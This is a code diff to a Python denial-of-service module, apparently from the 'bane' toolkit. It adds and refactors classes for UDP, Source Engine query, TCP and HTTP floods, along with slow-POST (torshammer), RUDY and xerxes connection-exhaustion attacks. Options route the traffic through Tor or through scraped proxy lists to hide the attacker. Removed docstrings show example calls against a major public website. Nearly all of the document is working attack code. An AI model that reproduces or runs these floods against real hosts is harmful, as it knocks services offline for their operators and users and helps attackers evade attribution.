@@ -29,11 +29,16 @@ if os.path.isdir('/data/data/com.termux/')==True:
     termux=True#the application which runs the module is Termux
 if ((termux==False) or (adr==False)):
  from bane.swtch import *
+
+
+
 def get_public_dns(timeout=15):
  try:
   return (requests.get('https://public-dns.info/nameservers.txt',timeout=timeout).text).split('\n')
  except:
   return []
+
+
 
 def reset():#reset all values
  global counter
@@ -60,7 +65,6 @@ def reset():#reset all values
 '''
 
 class udp_flood:
- __slots__=["target","port","ports","interval","min_size","max_size","connection","duration","limiting","logs","stop","counter","start"]
  def __init__(self,u,port=80,ports=None,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=False,logs=False):
   self.target=u
   self.port=port
@@ -112,14 +116,75 @@ class udp_flood:
     if self.limiting==True:
      time.sleep(self.interval)
    except:
+    try:
+     time.sleep(self.interval)
+    except:
+     pass
+ def reset(self):
+   for x in self.__dict__:
+    self.__dict__[x]=None
+ def kill(self):
+  self.stop=True
+  
+
+
+class vse_flood:
+ def __init__(self,u,port=80,ports=None,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=False,logs=False):
+  self.target=u
+  self.port=port
+  self.ports=ports
+  self.payload=b'\xff\xff\xff\xffTSource Engine Query\x00' # read more at https://developer.valvesoftware.com/wiki/Server_queries
+  self.interval=interval
+  self.connection=connection
+  self.duration=duration
+  self.limiting=limiting
+  self.logs=logs
+  self.stop=False
+  self.counter=0
+  self.start=time.time()
+  for x in range(threads):
+   t=threading.Thread(target=self.attack)
+   t.daemon=True
+   t.start()
+ def attack(self):
+  time.sleep(1)
+  tm=time.time()
+  while True:
+   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+    break
+   if self.stop==True:
+    break
+   try:
+    if self.ports:
+     p=random.choice(self.ports)
+    else:
+     p=self.port
+    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    if self.connection==True:
+     s.connect((self.target,p))
+    s.sendto(self.payload,(self.target,p))
+    self.counter+=1
+    if((self.logs==True) and (int(time.time()-tm)==1)):
+     sys.stdout.write("\rPackets: {}   ".format(self.counter))
+     sys.stdout.flush()
+     tm=time.time()
+    if self.limiting==True:
+     time.sleep(self.interval)
+   except:
     pass
     try:
      time.sleep(self.interval)
     except:
      pass
-  
+ def reset(self):
+   for x in self.__dict__:
+    self.__dict__[x]=None
+ def kill(self):
+  self.stop=True
+
+
+
 class tcp_flood:
- __slots__=["target","port","tor","speed","minsize","maxsize","duration","packs2","packs1","logs","stop","counter","start"]
  def __init__(self,u,p=80,min_size=10,max_size=50,threads=256,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
   self.logs=logs
   self.stop=False
@@ -130,11 +195,11 @@ class tcp_flood:
   self.port=p
   self.timeout=timeout
   self.tor=tor
-  self.minsize=min_size
-  self.maxsize=max_size
-  self.speed=interval
-  self.packs2=round_min
-  self.packs1=round_max
+  self.min_size=min_size
+  self.max_size=max_size
+  self.interval=interval
+  self.round_min=round_min
+  self.round_max=round_max
   for x in range(threads):
    t=threading.Thread(target=self.attack)
    t.daemon=True
@@ -155,11 +220,13 @@ class tcp_flood:
      s.connect((self.target,self.port))#connect to target 
      if (self.port==443) or (self.port==8443):
        s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)#use ssl if needed on specific ports
-     for l in range(random.randint(self.packs2,self.packs1)):#send packets with random number of times for each connection (number between "round_min" and "round_max")
+     for l in range(random.randint(self.round_min,self.round_max)):#send packets with random number of times for each connection (number between "round_min" and "round_max")
+      if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+       break
       if stop==True:
        break
       m=''
-      for li in range(random.randint(self.minsize,self.maxsize)): #each payload' size is chosen randomly between maximum and minimum values
+      for li in range(random.randint(self.min_size,self.max_size)): #each payload' size is chosen randomly between maximum and minimum values
        m+=random.choice(lis)
       try:
        if stop==True:
@@ -172,11 +239,16 @@ class tcp_flood:
         #print("Packets: {} | Bytes: {}".format(tcp_counter,len(m)))
       except:
        break
-      time.sleep(self.speed)
+      time.sleep(self.interval)
      s.close()
     except:
      pass
     time.sleep(.1)
+ def reset(self):
+   for x in self.__dict__:
+    self.__dict__[x]=None
+ def kill(self):
+  self.stop=True
  
 '''
   usage:
@@ -193,7 +265,6 @@ class tcp_flood:
 
 
 class http_spam:
- __slots__=["logs","stop","counter","start","target","duration","port","timeout","tor","speed","packs2","packs1","paths","postmin","postmax","postfmax","postfmin"]
  def __init__(self,u,p=80,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
   self.logs=logs
   self.stop=False
@@ -204,14 +275,14 @@ class http_spam:
   self.port=p
   self.timeout=timeout
   self.tor=tor
-  self.speed=interval
-  self.packs2=round_min
-  self.packs1=round_max
+  self.interval=interval
+  self.round_min=round_min
+  self.round_max=round_max
   self.paths=paths
-  self.postmin=post_min
-  self.postmax=post_max
-  self.postfmax=post_field_max
-  self.postfmin=post_field_min
+  self.post_min=post_min
+  self.post_max=post_max
+  self.post_field_max=post_field_max
+  self.post_field_min=post_field_min
   for x in range(threads):
    t=threading.Thread(target=self.attack)
    t.daemon=True
@@ -232,7 +303,9 @@ class http_spam:
     s.connect((self.target,self.port))
     if ((self.port==443) or (self.port==8443)):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    for fg in range(random.randint(self.packs2,self.packs1)):
+    for fg in range(random.randint(self.round_min,self.round_max)):
+     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+       break
      if stop==True: 
        break
      pa=random.choice(self.paths)#bypassing cache engine
@@ -269,10 +342,10 @@ class http_spam:
      else:
       req="POST"
       k=''
-      for _ in range(random.randint(self.postfmin,self.postfmax)):
+      for _ in range(random.randint(self.post_field_min,self.post_field_max)):
        k+=random.choice(lis)
       j=''
-      for x in range(random.randint(self.postmin,self.postmax)):
+      for x in range(random.randint(self.post_min,self.post_max)):
        j+=random.choice(lis)
       par =k+'='+j
       m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,par)
@@ -287,16 +360,19 @@ class http_spam:
         #print("Request: {} | Type: {} | Bytes: {}".format(http_counter,req,len(m)))
      except:
       break
-     time.sleep(self.speed)
+     time.sleep(self.interval)
     s.close()
    except:
     pass
    time.sleep(.1)
-  
+ def reset(self):
+   for x in self.__dict__:
+    self.__dict__[x]=None
+ def kill(self):
+  self.stop=True
 
 
 class prox_http_spam(threading.Thread):
- __slots__=["logs","stop","counter","start","httplist","socks4list","socks5list","target","duration","port","timeout","speed","packs2","packs1","paths","postmin","postmax","postfmax","postfmin"]
  def __init__(self,u,p=80,scraping_timeout=15,http_list=None,socks4_list=None,socks5_list=None,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
   self.logs=logs
   self.stop=False
@@ -316,14 +392,14 @@ class prox_http_spam(threading.Thread):
   self.port=p
   self.timeout=timeout
   self.tor=tor
-  self.speed=interval
-  self.packs2=round_min
-  self.packs1=round_max
+  self.interval=interval
+  self.round_min=round_min
+  self.round_max=round_max
   self.paths=paths
-  self.postmin=post_min
-  self.postmax=post_max
-  self.postfmax=post_field_max
-  self.postfmin=post_field_min
+  self.post_min=post_min
+  self.post_max=post_max
+  self.post_field_max=post_field_max
+  self.post_field_min=post_field_min
   for x in range(threads):
    t=threading.Thread(target=self.attack)
    t.daemon=True
@@ -364,7 +440,9 @@ class prox_http_spam(threading.Thread):
     s.connect((self.target,self.port))
     if ((self.port==443) or (self.port==8443)):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    for fg in range(random.randint(self.packs2,self.packs1)):
+    for fg in range(random.randint(self.round_min,self.round_max)):
+     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+       break
      if stop==True:
       break
      for l in range(random.randint(1,5)):
@@ -400,10 +478,10 @@ class prox_http_spam(threading.Thread):
      else:
       req="POST"
       k=''
-      for _ in range(random.randint(self.postfmin,self.postfmax)):
+      for _ in range(random.randint(self.post_field_min,self.post_field_max)):
        k+=random.choice(lis)
       j=''
-      for x in range(random.randint(self.postmin,self.postmax)):
+      for x in range(random.randint(self.post_min,self.post_max)):
        j+=random.choice(lis)
       par =k+'='+j
       m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,par)
@@ -418,46 +496,65 @@ class prox_http_spam(threading.Thread):
         #print("Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,lulzer_counter,req,len(m)))
      except:
       break
-     time.sleep(self.speed)
+     time.sleep(self.interval)
     s.close()
    except:
     pass
    time.sleep(.1)
-  
+ def reset(self):
+   for x in self.__dict__:
+    self.__dict__[x]=None
+ def kill(self):
+  self.stop=True  
 
 
-class reqpost(threading.Thread):
- def run(self):
-  self.maxcontent=maxcontent
-  self.mincontent=mincontent
-  self.target=target
-  self.port=port
-  self.timeout=_timeout
+class torshammer:
+ def __init__(self,u,p=80,threads=500,timeout=5,tor=False,duration=60,logs=False,max_content=15000,min_content=10000):
+  self.max_content=max_content
+  self.min_content=min_content
+  self.stop=False
+  self.start=time.time()
+  self.target=u
+  self.duration=duration
+  self.port=p
+  self.timeout=timeout
   self.tor=tor
-  time.sleep(2)
-  while (stop!=True):
+  self.logs=logs
+  for x in range(threads):
+   t=threading.Thread(target=self.attack)
+   t.daemon=True
+   t.start()
+ def attack(self):
+  time.sleep(1)
+  while True:
+   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+     break
+   if self.stop==True:
+     break
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     if self.tor==False:
      s.settimeout(self.timeout)
-    if tor==True:
+    if self.tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.connect((self.target,self.port))
-    if prints==True:
+    if self.logs==True:
         sys.stdout.write("\rConnected to {}:{}...".format(self.target,self.port))
         sys.stdout.flush()
         #print("Connected to {}:{}...".format(self.target,self.port))
     if ((self.port==443) or (self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    q=random.randint(self.mincontent,self.maxcontent)
-    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target))
+    q=random.randint(self.min_content,self.max_content)
+    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
     for i in range(q):
-     if stop==True:
+     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+      break
+     if self.stop==True:
       break
      h=random.choice(lis)
      try:
       s.send(h.encode('utf-8'))
-      if prints==True:
+      if self.logs==True:
         sys.stdout.write("\rPosted: {}".format(h))
         sys.stdout.flush()
         #print("Posted: {}".format(h))
@@ -468,122 +565,87 @@ class reqpost(threading.Thread):
    except:
     pass
    time.sleep(.1)
-   if stop==True:
+   if self.stop==True:
     break
-  self.maxcontent=None
-  self.mincontent=None
-  self.target=None
-  self.port=None
-  self.timeout=None
-  self.tor=None
-def torshammer(u,p=80,threads=500,timeout=5,set_tor=False,duration=60,logs=True,max_content_length=15000,min_content_length=10000):
- '''
-    this function is used to do torshammer attack, it connects to an ip or domain with a specific port, sends a POST request with legit http headers values then sends the body slowly to keep the socket open as long as possible. it can use tor as a proxy to anonimize the attack. it supports ssl connections unlike the original tool and some bugs has been fixed and simplified.
-    
-    it takes those parameters:
+ def reset(self):
+   for x in self.__dict__:
+    self.__dict__[x]=None
+ def kill(self):
+  self.stop=True
 
-    u: the target ip or domain
-    p: (set by default to: 80) the targeted port
-    threads: (set by default to: 500) number of connections to be created
-    timeout: (set by default to: 5) connection timeout flag value
-    set_tor: (set by default to: False) if you want to use tor as SOCKS5 proxy after activating it you must set this parameter to: True
 
-    example:
 
-    >>>import bane
-    >>>bane.torshammer('www.google.com',p=80)
-
-    >>>bane.torshammer('www.google.com',p=80,set_tor=True)
-
-'''
- thr=[]
- global maxcontent
- maxcontent=max_content_length#maximum content length to post
- global mincontent
- mincontent=min_content_length#minimum content length to post
- global stop
- stop=False
- global prints
- prints=logs
- global target
- target=u
- global port
- port=p
- global _timeout
- _timeout=timeout
- global tor
- tor=set_tor
- for x in range(threads):
-  try:
-     t =reqpost()
-     t.start()
-     thr.append(t)
-  except:
-    pass
- c=time.time()
- while True:
-  if stop==True:
-   break
-  try:
-   time.sleep(.1)
-   if int(time.time()-c)==duration:
-    stop=True
-    break
-  except KeyboardInterrupt:
-   stop=True
-   break
- if logs==True:
-     print("[*]Killing all threads...")
- for x in thr:
-    try:
-      x.join(1)
-    except Exception as e:
-      pass
-    del x
- if logs==True:
-     print("[*]Done!")
-class pham(threading.Thread):
- def run(self):
-  self.target=target
-  self.port=port
-  self.timeout=_timeout
-  self.maxcontent=maxcontent
-  self.mincontent=mincontent
-  global counter
-  time.sleep(2)
-  while (stop!=True):
+class prox_hammer:
+ def __init__(self,u,p=80,scraping_timeout=15,max_content=15000,min_content=10000,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=True):
+  self.httplist=http_list
+  if not self.httplist and self.httplist!=[]:
+   self.httplist=masshttp(timeout=scraping_timeout)
+  self.socks4list=socks4_list
+  if not self.socks4list and self.socks4list!=[] :
+   self.socks4list=massocks4(timeout=scraping_timeout)
+  self.socks5list=socks5_list
+  if not self.socks5list and self.socks5list!=[]:
+   self.socks5list=massocks5(timeout=scraping_timeout)
+  self.stop=False
+  self.start=time.time()
+  self.target=u
+  self.duration=duration
+  self.port=p
+  self.timeout=timeout
+  self.max_content=max_content
+  self.min_content=min_content
+  self.logs=logs
+  for x in range(threads):
+   t=threading.Thread(target=self.attack)
+   t.daemon=True
+   t.start()
+ def attack(self):
+  time.sleep(1)
+  while True:
+   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+     break
+   if self.stop==True:
+     break
    try:
-    z=random.randint(1,20)
-    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
-     line=random.choice(httplist)
-    elif (z in [13,14,15,16]):
-     line=random.choice(socks4list)
-    elif (z in [17,18,19,20]):
-     line=random.choice(socks5list)
+    bot_type=[]
+    if len(self.httplist)>0:
+     bot_type.append("h")
+    if len(self.socks4list)>0:
+     bot_type.append("s4")
+    if len(self.socks5list)>0:
+     bot_type.append("s5")
+    z=random.choice(bot_type)
+    if z=="h":
+     line=random.choice(self.httplist)
+    elif z=="s4":
+     line=random.choice(self.socks4list)
+    elif z=="s5":
+     line=random.choice(self.socks5list)
     ipp=line.split(":")[0].split("=")[0]
     pp=line.split(":")[1].split("=")[0]
     s =socks.socksocket()
-    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
+    if z=="h":
      s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
-    elif (z in [13,14,15,16]):
+    elif z=="s4":
      s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
-    elif (z in [17,18,19,20]):
+    elif z=="s5":
      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
-    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    if z<13:
+    if z=="h":
      s.settimeout(self.timeout)
     s.connect((self.target,self.port))
     if ((self.port==443)or(self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    q=random.randint(self.mincontent,self.maxcontent)
-    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target))
+    q=random.randint(self.min_content,self.max_content)
+    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
     for i in range(q):
-     if stop==True:
+     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+      break
+     if self.stop==True:
       break
      h=random.choice(lis)
      try:
       s.send(h.encode('utf-8'))
-      if prints==True:
+      if self.logs==True:
         sys.stdout.write("\rPosted: {} --> {}".format(h,ipp))
         sys.stdout.flush()
         #print("Posted: {} --> {}".format(h,ipp))
@@ -594,241 +656,37 @@ class pham(threading.Thread):
    except:
     pass
    time.sleep(.1)
-   if stop==True:
-    break
-  self.target=None
-  self.port=None
-  self.timeout=None
-  self.maxcontent=None
-  self.mincontent=None
-def prox_hammer(u,p=80,scraping_timeout=15,max_content_length=15000,min_content_length=10000,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=True):
- '''
-  u: target ip or domain
-  p: (set by default to: 80) targeted port
-  threads: (set by default to: 500) number of connections
-  timeout: (set by default to: 5) the connection timeout flag value
-  example:
-  >>>import bane
-  >>>bane.prox_hammer('www.google.com',threads=256)
-'''
- thr=[]
- global maxcontent
- maxcontent=max_content_length
- global mincontent
- mincontent=min_content_length
- global httplist
- if http_list:
-  httplist=http_list
- else:
-  httplist=masshttp(timeout=scraping_timeout)
- global socks4list
- if socks4_list:
-  socks4list=socks4_list
- else:
-  socks4list=massocks4(timeout=scraping_timeout)
- global socks5list
- if socks5_list:
-  socks5list=socks5_list
- else:
-  socks5list=massocks5(timeout=scraping_timeout)
- global stop
- stop=False
- global prints
- prints=logs
- global pointer
- global target
- target=u
- global port
- port=p
- global _timeout
- _timeout=timeout
- for j in range(threads):
-  try:
-    t=pham()
-    t.start()
-    thr.append(t)
-    time.sleep(.001)
-  except:
-    pass
- c=time.time()
- while True:
-  if stop==True:
-   break
-  try:
-   time.sleep(.1)
-   if int(time.time()-c)==duration:
-    stop=True
-    break
-  except KeyboardInterrupt:
-   stop=True
-   break
- if logs==True:
-     print("[*]Killing all threads...")
- for x in thr:
-    try:
-      x.join(1)
-    except Exception as e:
-      pass
-    del x
- if logs==True:
-     print("[*]Done!")
-class rudypost(threading.Thread):
- def run(self):
-  self.r_wait=r_wait
-  self.r_max=r_max
-  self.r_min=r_min
-  self.form_lng=form_lng
-  self.max_fo=max_fo
-  self.min_fo=min_fo
-  self.fo=fo
-  self.pag=pag
-  self.target=target
-  self.port=port
-  self.timeout=_timeout
+ def reset(self):
+   for x in self.__dict__:
+    self.__dict__[x]=None
+ def kill(self):
+  self.stop=True
+
+
+class xerxes:
+ def __init__(self,u,p=80,threads=500,timeout=5,duration=60,logs=False,tor=False):
+  self.target=u
+  self.port=p
+  self.stop=False
+  self.duration=duration
+  self.timeout=timeout
   self.tor=tor
-  time.sleep(2)
-  while (stop!=True):
-   try:
-    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    if self.tor==False:
-     s.settimeout(self.timeout)
-    if tor==True:
-     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
-    s.connect((self.target,self.port))
-    if prints==True:
-        sys.stdout.write("\rConnected to {}:{}...".format(self.target,self.port))
-        sys.stdout.flush()
-        #print("Connected to {}:{}...".format(self.target,self.port))
-    if ((self.port==443) or (self.port==8443)):
-     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    if self.form_lng<1:
-     q=random.randint(self.min_fo,self.max_fo)
-    else:
-     q=self.form_lng
-    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(self.pag,random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target))
-    rud='{}='.format(self.fo)
-    s.send(rud.encode('utf-8'))
-    for i in range(q):
-     if stop==True:
-      break
-     h=random.choice(lis)
-     try:
-      s.send(h.encode('utf-8'))
-      if prints==True:
-        sys.stdout.write("\rPosted: {}".format(h))
-        sys.stdout.flush()
-        #print("Posted: {}".format(h))
-      if self.r_wait<0:
-       time.sleep(random.randint(self.r_min,self.r_max))
-      else:
-       time.sleep(self.r_wait)
-     except:
-      break
-    s.close()
-   except:
-    pass
-   time.sleep(.1)
-   if stop==True:
-    break
-  self.r_wait=None
-  self.r_max=None
-  self.r_min=None
-  self.form_lng=None
-  self.max_fo=None
-  self.min_fo=None
-  self.fo=None
-  self.pag=None
-  self.target=None
-  self.port=None
-  self.timeout=None
-  self.tor=None
-def rudy(u,p=80,threads=500,form='q',form_length=0,max_form_length=1000000,min_form_length=10000,page='/',timeout=5,set_tor=False,duration=60,logs=True,wait=-1,max_wait=5,min_wait=1):
- '''
-    this function is used to do R.U.D.Y attack, it connects to an ip or domain with a specific port, sends a POST request with legit http headers values then sends the body slowly to keep the socket open as long as possible. it can use tor as a proxy to anonimize the attack. it supports ssl connections unlike the original tool and some bugs has been fixed and simplified.
-    
-    it takes those parameters:
-
-    u: the target ip or domain
-    p: (set by default to: 80) the targeted port
-    threads: (set by default to: 500) number of connections to be created
-    timeout: (set by default to: 5) connection timeout flag value
-    set_tor: (set by default to: False) if you want to use tor as SOCKS5 proxy after activating it you must set this parameter to: True
-
-    example:
-
-    >>>import bane
-    >>>bane.torshammer('www.google.com',p=80)
-
-    >>>bane.torshammer('www.google.com',p=80,set_tor=True)
-
-'''
- thr=[]
- global r_wait
- r_wait=wait#time to wait between packets,set it to negative value to get random waiting interval
- global r_max
- r_max=max_wait#maximum waiting time
- global r_min
- r_min=min_wait#minimum waiting time
- global form_lng
- form_lng=form_length#form's length
- global pag
- pag=page#page where the form existes
- global fo
- fo=form
- global max_fo
- max_fo=max_form_length#maximun form's length
- global min_fo
- min_fo=min_form_length#minimun form's length
- global stop
- stop=False
- global prints
- prints=logs
- global target
- target=u
- global port
- port=p
- global _timeout
- _timeout=timeout
- global tor
- tor=set_tor
- for x in range(threads):
-  try:
-     t =rudypost()
-     t.start()
-     thr.append(t)
-  except:
-    pass
- c=time.time()
- while True:
-  if stop==True:
-   break
-  try:
-   time.sleep(.1)
-   if int(time.time()-c)==duration:
-    stop=True
-    break
-  except KeyboardInterrupt:
-   stop=True
-   break
- if logs==True:
-     print("[*]Killing all threads...")
- for x in thr:
-    try:
-      x.join(1)
-    except Exception as e:
-      pass
-    del x
- if logs==True:
-     print("[*]Done!")
-class xer(threading.Thread):
- def run(self):
-  x=pointer#thread's ID
-  self.target=target
-  self.port=port
-  self.timeout=_timeout
-  self.tor=tor
-  time.sleep(2)
-  while (stop!=True):
+  self.start=time.time()
+  self.logs=logs
+  self.id_key=0
+  for x in range(threads):
+   t=threading.Thread(target=self.attack)
+   t.daemon=True
+   t.start()
+   self.id_key+=1
+ def attack(self):
+  x=self.id_key
+  time.sleep(1)
+  while True:
+   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+     break
+   if self.stop==True:
+     break
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     if self.tor==False:
@@ -836,269 +694,115 @@ class xer(threading.Thread):
     if self.tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.connect((self.target,self.port))
-    if prints==True:
-     print("[Connected to {}:{}]".format(self.target,self.port))
-    while (stop!=True):
+    """if self.logs==True:
+     #print("[Connected to {}:{}]".format(self.target,self.port))
+     sys.stdout.write("\r[Connected to {}:{}]".format(self.target,self.port))
+     sys.stdout.flush()"""
+    while True:
+     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+      break
+     if self.stop==True:
+      break
      try:
       s.send("\x00".encode('utf-8'))#send NULL character
-      if prints==True:
-       print("[{}: Voly sent]".format(x))
+      if self.logs==True:
+       sys.stdout.write("\r[{}: Voly sent]    ".format(x))
+       sys.stdout.flush()
      except Exception as e:
       break
      time.sleep(.2)
    except:
     pass
    time.sleep(.3)
-  self.target=None
-  self.port=None
-  self.timeout=None
-  self.tor=None
-  x=None
-def xerxes(u,p=80,threads=500,timeout=5,duration=60,logs=True,set_tor=False):
- '''
-   everyone heard about the 'xerxes.c' tool ( https://github.com/zanyarjamal/xerxes/blob/master/xerxes.c ), but not everyone really understand what does it do exactly to take down targets, actually some has claimed that it sends few Gbps :/ (which is something really funny looool) . let me illuminate you: this tool is similar to slowloris, it consume all avaible connections on the server and keep them open as long as possible not by sending partial http headers slowly but by sending "NULL byte character" per connection every 0.3 seconds (so actually it doesn't really send much data). it uses 48 threads and 8 connections per thread, so the maximum number of connections that this tool can create is: 384 connections. that's why it works perfectly against apache for example (maximum number of connections that it handle simultaniously is 256 by dafault) but not against the ones with larger capacity.
+ def reset(self):
+   for x in self.__dict__:
+    self.__dict__[x]=None
+ def kill(self):
+  self.stop=True
 
-  here i did something different a bit but it gave better results: instead of a 8 connections per thread, i used one per thread with infinite loop so when the connection is closed, a new one will be created unlike the C version, and you can use as much as you need of threads for more connections (not just 384)!!! and this gave me a much better results and it will do the same to you ;)
 
-  this function takes the following parameters:
-    
-  u: target ip or domain
-  p: (set by default to: 80) targeted port
-  threads: (set by default to: 500) number of connections
-  timeout: (set by default to: 5) the connection timeout flag value
-
-  example:
-
-  >>>import bane
-  >>>bane.xerxes_attack('www.google.com',threads=256)
-
-'''
- thr=[]
- global tor
- tor=set_tor
- global stop
- stop=False
- global prints
- prints=logs
- global pointer
- global target
- target=u
- global port
- port=p
- global _timeout
- _timeout=timeout
- for j in range(threads):
-  try:
-    pointer=j
-    t=xer()
-    t.start()
-    thr.append(t)
-    time.sleep(.001)
-  except:
-    pass
- c=time.time()
- while True:
-  if stop==True:
-   break
-  try:
-   time.sleep(.1)
-   if int(time.time()-c)==duration:
-    stop=True
-    break
-  except KeyboardInterrupt:
-   stop=True
-   break
- if logs==True:
-     print("[*]Killing all threads...")
- for x in thr:
-    try:
-      x.join(1)
-    except Exception as e:
-      pass
-    del x
- if logs==True:
-     print("[*]Done!")
-class pxer(threading.Thread):
- def run(self):
-  x=pointer
-  self.target=target
-  self.port=port
-  self.timeout=_timeout
-  time.sleep(2)
-  while (stop!=True):
+class prox_xerxes:
+ def __init__(self,u,scraping_timeout=15,p=80,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=False):
+  self.httplist=http_list
+  if not self.httplist and self.httplist!=[]:
+   self.httplist=masshttp(timeout=scraping_timeout)
+  self.socks4list=socks4_list
+  if not self.socks4list and self.socks4list!=[] :
+   self.socks4list=massocks4(timeout=scraping_timeout)
+  self.socks5list=socks5_list
+  if not self.socks5list and self.socks5list!=[]:
+   self.socks5list=massocks5(timeout=scraping_timeout)
+  self.stop=False
+  self.start=time.time()
+  self.target=u
+  self.duration=duration
+  self.port=p
+  self.timeout=timeout
+  self.logs=logs
+  self.id_key=0
+  for x in range(threads):
+   t=threading.Thread(target=self.attack)
+   t.daemon=True
+   t.start()
+   self.id_key+=1
+ def attack(self):
+  x=self.id_key
+  time.sleep(1)
+  while True:
+   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+     break
+   if self.stop==True:
+     break
    try:
-    z=random.randint(1,20)
-    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
-     line=random.choice(httplist)
-    elif (z in [13,14,15,16]):
-     line=random.choice(socks4list)
-    elif (z in [17,18,19,20]):
-     line=random.choice(socks5list)
+    bot_type=[]
+    if len(self.httplist)>0:
+     bot_type.append("h")
+    if len(self.socks4list)>0:
+     bot_type.append("s4")
+    if len(self.socks5list)>0:
+     bot_type.append("s5")
+    z=random.choice(bot_type)
+    if z=="h":
+     line=random.choice(self.httplist)
+    elif z=="s4":
+     line=random.choice(self.socks4list)
